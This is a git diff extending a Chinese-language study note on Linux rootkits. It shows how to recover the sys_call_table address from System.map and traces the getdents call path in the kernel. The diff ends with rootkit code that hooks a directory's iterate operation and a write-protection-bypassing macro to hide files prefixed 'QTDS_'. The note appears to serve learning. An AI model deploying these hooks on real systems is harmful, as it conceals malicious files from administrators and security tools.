@@ -415,6 +415,12 @@ find_task(pid_t pid)
 
 ### 获取sys_call_table地址
 
+
+
+系统调用表sys_call_table是系统内核中的一块区间，作用是为了将系统调用号与需要调用的服务进行连接，相当于查表的行为，但是sys_call_table并不是可导出的linux内核符号。
+
+
+
 #### 暴力搜索地址空间
 
 [参考](https://wohin.me/rootkit/2017/05/08/LinuxRootkitExp-0001.html)
@@ -491,7 +497,16 @@ unsigned long **get_syscalltable(void)
 
 
 
+#### 通过读取/boot/System.map-$(uname -r)文件获得
 
+```
+smap="/boot/System.map-$(uname -r)"
+echo -e "#pragma once" &gt; ./sysgen.h
+echo -e "#include <linux/fs.h>" >> ./sysgen.h
+symbline=$(cat $smap | grep '\Wsys_call_table$')
+set $symbline
+echo -e "void** sys_call_table = (void**)0x$1;" >> ./sysgen.h
+```
 
 
 
@@ -570,13 +585,325 @@ int main(int argc, char *argv[]) {
 
 ### 文件隐藏
 
-要实现文件隐藏需要对文件遍历有所了解。
+[参考](https://blog.brickgao.com/2016/08/07/simple-rootkit/)
 
- 文件遍历主要通过是系统调用`getdents`和`getdents64`实现，它们的作用是获取目录项。 
+要实现文件隐藏需要对文件遍历有所了解，比如从用户的角度来考虑，用户是怎么获取文件信息的，最常见的就是ls命令，使用strace ls 看看ls进行了哪些系统调用。
 
-[参考](https://wohin.me/rootkit/2017/05/11/LinuxRootkitExp-00022.html)
+```
+…………
+open(".", O_RDONLY|O_NONBLOCK|O_DIRECTORY|O_CLOEXEC) = 3
+fstat(3, {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
+getdents(3, /* 31 entries */, 32768)    = 1056
+getdents(3, /* 0 entries */, 32768)     = 0
+close(3)                                = 0
+…………
+```
+
+从系统ls所经过的系统调用中可以看到，文件遍历主要通过是系统调用`getdents`实现。
 
 
+
+**目录文件（directory file）**
+
+> 目录文件包含了其他文件的名字以及指向与这些文件有关的信息的指针——《UNIX环境高级编程》
+>
+> 也就是说，directory file不仅指向目录，同时还指向目录的具体文件。
+
+**函数声明sys_getdents**
+
+```
+/*https://elixir.bootlin.com/linux/v4.15/source/include/linux/syscalls.h#L630*/
+
+asmlinkage long sys_getdents(unsigned int fd,
+				struct linux_dirent __user *dirent,
+				unsigned int count);
+```
+
+getdents（）从打开文件描述符 fd 所引用的目录文件中遍历读取 linux_dirent 结构体到 dirp 所指向的大小为count 的缓冲区中。也就是说，ls 命令通过 getdents 来获取当前或者指定文件夹的问（包括文件夹），处理以后输出给调用 ls 命令的用户。因此想要实现文件隐藏的一个思路就是对 getdents 或者 getdents64 的返回值对我们想要隐藏的信息进行过滤。
+
+文件描述符 fd 就不用多说了，主要来看看 linux_dirent 结构体。
+
+**linux_dirent结构体**
+
+```
+/* https://elixir.bootlin.com/linux/v4.15/source/fs/readdir.c#L151 */
+struct linux_dirent {
+	unsigned long	d_ino;   /* inode number 索引节点号*/
+	unsigned long	d_off;   /* offset to this dirent 在目录文件中的偏移*/
+	unsigned short	d_reclen;/* length of this d_name 文件名的长度*/
+	char		d_name[1];   /* file name 文件名*/
+};
+```
+
+从其定义上看，存储的信息也只有名字信息，所以dirent的作用也是索引。
+
+**getdents函数定义**
+
+```
+/* https://elixir.bootlin.com/linux/v4.15/source/fs/readdir.c#L212 */
+SYSCALL_DEFINE3(getdents, unsigned int, fd,
+		struct linux_dirent __user *, dirent, unsigned int, count)
+{
+	struct fd f;
+	struct linux_dirent __user * lastdirent;
+	struct getdents_callback buf = {
+		.ctx.actor = filldir,
+		.count = count,
+		.current_dir = dirent
+	};
+	int error;
+	……
+	error = iterate_dir(f.file, &buf.ctx);   ///主要部分
+	……
+}
+```
+
+从getdents的函数定义中找到，主要调用了`iterate_dir`，跟进iterate_dir
+
+**iterate_dir函数定义**
+
+```
+/* https://elixir.bootlin.com/linux/v4.15/source/fs/readdir.c#L26 */
+int iterate_dir(struct file *file, struct dir_context *ctx)
+{
+	struct inode *inode = file_inode(file);
+	bool shared = false;
+	int res = -ENOTDIR;
+	if (file->f_op->iterate_shared)
+		shared = true;
+	else if (!file->f_op->iterate)
+		goto out;
+		
+	……
+
+	if (!IS_DEADDIR(inode)) {
+		ctx->pos = file->f_pos;
+		if (shared)
+			res = file->f_op->iterate_shared(file, ctx);
+		else
+			res = file->f_op->iterate(file, ctx);
+		file->f_pos = ctx->pos;
+		fsnotify_access(file);
+		file_accessed(file);
+	}
+	……
+}
+EXPORT_SYMBOL(iterate_dir);
+```
+
+**struct file 的定义**
+
+```
+/* https://elixir.bootlin.com/linux/v4.15/source/include/linux/fs.h#L852 */
+struct file {
+	……
+	const struct file_operations	*f_op;
+	……
+	
+} __randomize_layout
+  __attribute__((aligned(4)));	/* lest something weird decides that 2 is OK */
+```
+
+f_op是file_operations 结构体
+
+```
+if (shared)
+			res = file->f_op->iterate_shared(file, ctx);
+		else
+			res = file->f_op->iterate(file, ctx);
+```
+
+在 iterate_dir 中主要调用了 file_operations 里的 iterate 函数
+
+```
+/* https://elixir.bootlin.com/linux/v4.15/source/include/linux/fs.h#L1692 */
+struct file_operations {
+	……
+	int (*iterate) (struct file *, struct dir_context *);
+	int (*iterate_shared) (struct file *, struct dir_context *);
+	……
+} __randomize_layout;
+```
+
+ **struct dir_context 的定义**
+
+```
+/* https://elixir.bootlin.com/linux/v4.15/source/include/linux/fs.h#L1657 */
+
+struct dir_context;
+typedef int (*filldir_t)(struct dir_context *, const char *, int, loff_t, u64,
+			 unsigned);
+
+struct dir_context {
+	const filldir_t actor;
+	loff_t pos;
+};
+```
+
+actor 就是 filldir_t 类型
+
+iterate 的具体实现是根据不同的文件系统而不一样的，以ext4为例：
+
+```
+/* https://elixir.bootlin.com/linux/v4.15/source/fs/ext4/dir.c#L652 */
+const struct file_operations ext4_dir_operations = {
+	.llseek		= ext4_dir_llseek,
+	.read		= generic_read_dir,
+	.iterate_shared	= ext4_readdir,
+	.unlocked_ioctl = ext4_ioctl,
+#ifdef CONFIG_COMPAT
+	.compat_ioctl	= ext4_compat_ioctl,
+#endif
+	.fsync		= ext4_sync_file,
+	.open		= ext4_dir_open,
+	.release	= ext4_release_dir,
+};
+```
+
+可以看到在ext4中，使用的是 iterate_shared
+
+也就是说，通过getdents系统调用来获取当前目录下的文件时，经过`file->f_op->iterate(file, ctx)`，或者`file->f_op->iterate_shared(file, ctx)`的函数调用，在ext4中
+
+```
+.iterate_shared	= ext4_readdir
+```
+
+实际上调用的是ext4_dir_operations函数集中的ext4_readdir()函数。由ex4文件系统驱动来读取当前目录文件中的一个个目录项。 ext4_readdir最终会通过filldir把目录里面的项目一个一个的填到getdents返回的缓冲区里，缓冲区里是一个个的linux_dirent。 
+
+```
+/* https://elixir.bootlin.com/linux/v4.15/source/fs/ext4/dir.c#L103 */
+static int ext4_readdir(struct file *file, struct dir_context *ctx)
+{
+	……
+	if (is_dx_dir(inode)) {
+		err = ext4_dx_readdir(file, ctx);
+		if (err != ERR_BAD_DX_DIR) {
+			return err;
+		}
+		……
+	}
+	……
+}
+```
+
+ext4_dx_readdir 的定义
+
+```
+/* https://elixir.bootlin.com/linux/v4.15/source/fs/ext4/dir.c#L526 */
+static int ext4_dx_readdir(struct file *file, struct dir_context *ctx)
+{
+		……
+		if (call_filldir(file, ctx, fname))
+			break;
+		……
+}
+```
+
+call_filldir 的定义
+
+```
+/* https://elixir.bootlin.com/linux/v4.15/source/fs/ext4/dir.c#L499 */
+/*
+ * This is a helper function for ext4_dx_readdir.  It calls filldir
+ * for all entres on the fname linked list.  (Normally there is only
+ * one entry on the linked list, unless there are 62 bit hash collisions.)
+ */
+static int call_filldir(struct file *file, struct dir_context *ctx,
+			struct fname *fname)
+{
+	……
+	while (fname) {
+		if (!dir_emit(ctx, fname->name,
+				fname->name_len,
+				fname->inode,
+				get_dtype(sb, fname->file_type))) {
+			info->extra_fname = fname;
+			return 1;
+		}
+		fname = fname->next;
+	}
+	……
+}
+```
+
+dir_emit 的定义
+
+```
+/* https://elixir.bootlin.com/linux/v4.15/source/include/linux/fs.h#L3366 */
+static inline bool dir_emit(struct dir_context *ctx,
+			    const char *name, int namelen,
+			    u64 ino, unsigned type)
+{
+	return ctx->actor(ctx, name, namelen, ctx->pos, ino, type) == 0;
+}
+```
+
+最终看到，dir_emit 中调用了ctx->actor，也就是之前分析的filldir。
+
+整个调用流程如下：
+
+```
+sys_getdents -> iterate_dir -> struct file_operations.iterate ->  中间省略 -> struct dir_context.actor(也就是filldir)
+```
+
+因此文件隐藏钩子的思路是 hook 相应目录的 iterate，把 dir_context 的 actor 改为 fake_filldir，fake_filldir 把需要隐藏的文件过滤。 
+
+```
+int fake_iterate(struct file *filp, struct dir_context *ctx)
+{
+    // 备份真的 ``filldir``，以备后面之需。
+    real_filldir = ctx->actor;
+
+    // 把 ``struct dir_context`` 里的 ``actor``，
+    // 也就是真的 ``filldir``
+    // 替换成我们的假 ``filldir``
+    *(filldir_t *)&ctx->actor = fake_filldir;
+
+    return real_iterate(filp, ctx);
+}
+#define SECRET_FILE "QTDS_"
+int fake_filldir(struct dir_context *ctx, const char *name, int namlen,
+             loff_t offset, u64 ino, unsigned d_type)
+{
+    if (strncmp(name, SECRET_FILE, strlen(SECRET_FILE)) == 0) {
+        // 如果是需要隐藏的文件，直接返回，不填到缓冲区里。
+        printk("Hiding: %s", name);
+        return 0;
+    }
+    // 如果不是需要隐藏的文件，
+    // 交给的真的 ``filldir`` 把这个记录填到缓冲区里。
+    return real_filldir(ctx, name, namlen, offset, ino, d_type);
+}
+```
+
+最后是一个宏，来替换指定目录下的iterate
+
+```
+#define set_f_op(op, path, new, old)    \
+    do{                                 \
+        struct file *filp;              \
+        struct file_operations *f_op;   \
+        printk("Opening the path: %s.\n", path);    \
+        filp = filp_open(path, O_RDONLY, 0);        \
+        if(IS_ERR(filp)){                           \
+            printk("Failed to open %s with error %ld.\n",   \
+                path, PTR_ERR(filp));                       \
+            old = NULL;                                     \
+        }                                                   \
+        else{                                               \
+            printk("Succeeded in opening: %s.\n", path);    \
+            f_op = (struct file_operations *)filp->f_op;    \
+            old = f_op->op;                                 \
+            printk("Changing iterate from %p to %p.\n",     \
+                    old, new);                              \
+            disable_write_protection();                     \
+            f_op->op = new;                                 \
+            enable_write_protection();                      \
+        }                                                   \
+    }while(0)
+```
+
+具体使用iterate还是iterate_shared要看具体的内核版本，本次环境为4.15.0，使用的是iterate_shared。
 
 
 
